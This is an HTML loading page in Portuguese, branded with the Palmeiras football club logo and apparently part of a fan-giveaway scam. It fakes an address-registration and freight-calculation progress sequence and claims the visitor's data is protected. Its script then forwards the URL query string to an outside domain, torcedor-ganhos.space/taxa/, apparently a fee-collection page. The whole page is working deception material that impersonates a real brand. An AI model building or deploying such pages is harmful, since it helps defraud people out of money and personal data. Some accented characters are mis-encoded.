<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Palmeiras - Loading</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background: linear-gradient(135deg, #006437, #FFFFFF);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            padding: 60px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            animation: fadeIn 1s ease-in-out;
            position: relative;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .red-bar {
            height: 5px;
            background: #006437;
            margin-bottom: 30px;
            border-radius: 3px;
        }

        .logo {
            width: 80px;
            height: auto;
            margin-bottom: 40px;
        }

        .loader-container {
            margin-bottom: 40px;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #006437;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 30px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader-text {
            font-size: 18px;
            font-weight: bold;
            color: #374151;
            max-width: 90%;
            margin: 0 auto;
            line-height: 1.4;
            transition: all 0.5s ease;
        }

        .jump {
            animation: jump 0.6s infinite;
            color: #006437;
        }

        @keyframes jump {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .progress-container {
            margin-top: 40px;
            background: #f3f4f6;
            border-radius: 10px;
            padding: 20px;
            border: 2px solid #e5e7eb;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e5e7eb;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #006437, #002d00);
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
            animation: progressGlow 2s ease-in-out infinite alternate;
        }

        @keyframes progressGlow {
            0% { box-shadow: 0 0 5px rgba(0, 102, 51, 0.3); }
            100% { box-shadow: 0 0 15px rgba(0, 102, 51, 0.6); }
        }

        .progress-steps {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #6b7280;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .step-icon {
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            color: white;
            transition: all 0.3s ease;
        }

        .step.active .step-icon {
            background: #006437;
        }

        .step.completed .step-icon {
            background: #10b981;
        }

        .step.completed .step-icon::before {
            content: "âœ“";
        }

        .security-info {
            background: #f0fdf4;
            border-radius: 10px;
            padding: 15px;
            margin-top: 30px;
            border: 1px solid #bbf7d0;
        }

        .security-text {
            color: #166534;
            font-size: 12px;
            line-height: 1.4;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .security-icon {
            font-size: 16px;
        }

        @media (max-width: 480px) {
            .container {
                padding: 40px 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loader-text {
                font-size: 16px;
            }
            
            .progress-steps {
                font-size: 10px;
            }
            
            .step-icon {
                width: 14px;
                height: 14px;
                font-size: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="red-bar"></div>
        <img src="../assets/images/palmeiras-logo.png" alt="Logo do Palmeiras" class="logo">
        
        <div class="loader-container">
            <div class="loader"></div>
            <div class="loader-text" id="loader-text">
                Estamos cadastrando<br>seu endereÃ§o de envio...
            </div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
            
            <div class="progress-steps">
                <div class="step active" id="step1">
                    <div class="step-icon">1</div>
                    <span>Cadastrando</span>
                </div>
                <div class="step" id="step2">
                    <div class="step-icon">2</div>
                    <span>Calculando</span>
                </div>
                <div class="step" id="step3">
                    <div class="step-icon">3</div>
                    <span>Finalizando</span>
                </div>
            </div>
        </div>
        
        <div class="security-info">
            <div class="security-text">
                <span class="security-icon">ðŸ”’</span>
                Seus dados estÃ£o protegidos e sendo processados com seguranÃ§a
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const loaderText = document.getElementById('loader-text');
            const progressFill = document.getElementById('progress-fill');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            
            // Primeira etapa - Cadastrando endereÃ§o (0-5 segundos)
            progressFill.style.width = '33%';
            
            // Segunda etapa - Calculando frete (5-10 segundos)
            setTimeout(() => {
                loaderText.innerHTML = "Calculando valor de frete";
                loaderText.classList.add('jump');
                
                // Atualizar steps
                step1.classList.remove('active');
                step1.classList.add('completed');
                step2.classList.add('active');
                
                // Atualizar progress
                progressFill.style.width = '66%';
            }, 5000);
            
            // Terceira etapa - Finalizando (8-10 segundos)
            setTimeout(() => {
                loaderText.innerHTML = "Finalizando processo...";
                
                // Atualizar steps
                step2.classList.remove('active');
                step2.classList.add('completed');
                step3.classList.add('active');
                
                // Atualizar progress
                progressFill.style.width = '100%';
            }, 8000);
            
            // Redirect final (10 segundos)
            setTimeout(() => {
                step3.classList.remove('active');
                step3.classList.add('completed');
                
                const queryString = window.location.search || '';
                const baseUrl = "https://torcedor-ganhos.space/taxa/";
                const redirectUrl = baseUrl + queryString;
                window.location.href = redirectUrl;
            }, 10000);
        });

        // Adicionar efeito de entrada suave
        document.addEventListener('DOMContentLoaded', function() {
            const container = document.querySelector('.container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            
            setTimeout(() => {
                container.style.transition = 'all 1s ease-in-out';
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 100);
        });
    </script>
</body>
</html>
